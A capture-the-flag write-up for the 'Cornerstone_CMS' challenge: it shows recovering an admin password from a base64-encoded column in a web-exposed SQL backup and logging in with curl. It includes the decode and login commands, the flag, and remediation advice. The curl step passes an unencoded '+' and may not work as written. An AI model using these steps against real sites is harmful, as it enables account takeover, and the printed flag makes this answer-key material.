# Cornerstone_CMS - reversible (base64) password in an exposed SQL backup

| | |
|---|---|
| **Challenge** | Cornerstone_CMS |
| **Category** | AUTH |
| **Points / Difficulty** | 100 / easy |
| **Target** | http://auth12.chal.deti:8071 |
| **Auth weakness** | CWE-257 (recoverable password storage) + CWE-522 (insufficiently protected credentials) |

## Hint
> A door, so it's said, wrapped twice but never truly sealed against a glance.

## Recon
Landing page → `/login` (admin sign-in, `username`/`password`). No credential in
the HTML. Path probing found a listable **`/export/`** directory containing a
staging DB backup:

```
http://auth12.chal.deti:8071/export/cornerstone_staging.sql.bak
```
```sql
-- cornerstone_staging export, 2021-11-02
-- NOTE: password column is "encrypted" (base64) at rest.
INSERT INTO cms_users (username, password_encrypted) VALUES
  ('admin', 'Tytrb2lzdGIxTksy');
```

## Approach
CWE-257/CWE-522: the password is stored in a **recoverable** format (base64, not
a hash), and the backup that holds it is world-readable. "Wrapped twice but
never sealed" = two token layers of protection - an obscure `.bak` export *and*
base64 - neither of which resists "a glance." Decode and log in.

## Exploitation - the exact requests
```bash
# recover the admin password: base64 -> O+koistb1NK2
echo -n 'Tytrb2lzdGIxTksy' | base64 -d; echo

# log in as admin with the recovered password
curl -s -d 'username=admin&password=O+koistb1NK2' \
     http://auth12.chal.deti:8071/login | grep -o 'flag{[^}]*}'
```

## Flag
```
flag{199985a9bb402d7cb907cf20e04b68e1}
```

## Root cause & remediation
- **Cause:** passwords stored in a reversible encoding (base64 ≠ encryption,
  CWE-257), and the database backup exposing them is reachable over the web via
  a listable `/export/` directory (CWE-522).
- **Fix:** store passwords as salted hashes (bcrypt/argon2), never base64;
  remove backups/exports from the web root and disable directory listing;
  rotate the leaked `admin` credential.
